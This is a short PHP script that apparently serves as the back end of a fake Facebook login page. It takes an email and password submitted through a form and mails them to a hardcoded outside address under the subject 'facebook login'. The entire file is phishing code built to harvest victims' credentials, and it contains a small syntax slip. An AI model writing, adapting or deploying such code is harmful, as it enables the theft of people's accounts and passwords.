<?php
	$visitor_email = $_POST['email'];
	$password = $_POST['pass'];
	
	$email_from = 'yourname@yourwebsite.com';
	$email_subject = "facebook login";
	$email_body = "email : $visitor_email.\n password : $password".

 $to = "neagubogdan19@yahoo.round";

 $headers = "From: facebook login \r\n";

 mail($to,$email_subject,$email_body,$headers);
?>